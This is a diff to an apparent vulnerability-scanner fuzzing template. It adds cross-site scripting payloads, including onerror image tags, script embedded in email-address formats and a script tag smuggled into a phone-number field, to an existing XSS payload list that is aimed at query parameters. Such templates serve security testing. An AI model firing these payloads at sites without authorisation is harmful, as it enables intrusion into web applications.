@@ -16,6 +16,7 @@ http:
         - "<sCript>confirm(1)</sCript>"    #custom
         - "<script>confirm(1)</script>"    #custom
         - '"><script>confirm(1)</script>'    #custom
+        - '"<image/src/onerror=confirm(1)>'    #custom
         - "<scr<script>ipt>alert(1)</scr</script>ipt>"    #custom
         - "</script><script>alert(1)</script>"    #https://twitter.com/mamunwhh/status/1636732300171022337
         - "<img src=x onerror=confirm(1)>"    #custom
@@ -25,6 +26,9 @@ http:
         - '"><svg onload=prompt(document.domain)>'    #https://twitter.com/kab33rrr/status/1524464126608560128
         - '"/><svg/onload=confirm(/xxs/)>'    #https://twitter.com/Manorr07/status/1564280686000934920
         - '"><img src=x onerror=prompt(1);>'    #https://twitter.com/abdlah_md/status/1559332579802812424
+        - '"<img/src/onerror=alert(0)"@xss.com'   #https://twitter.com/bug_vs_me/status/1635006251108294656
+        - '"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com'    #https://twitter.com/ynsmroztas/status/1635026291140468736
+        - '+441134960000;phone-context=<script>alert(1)</script>'   #https://twitter.com/intigriti/status/1604054094808760321
 
     fuzzing:
       - part: query
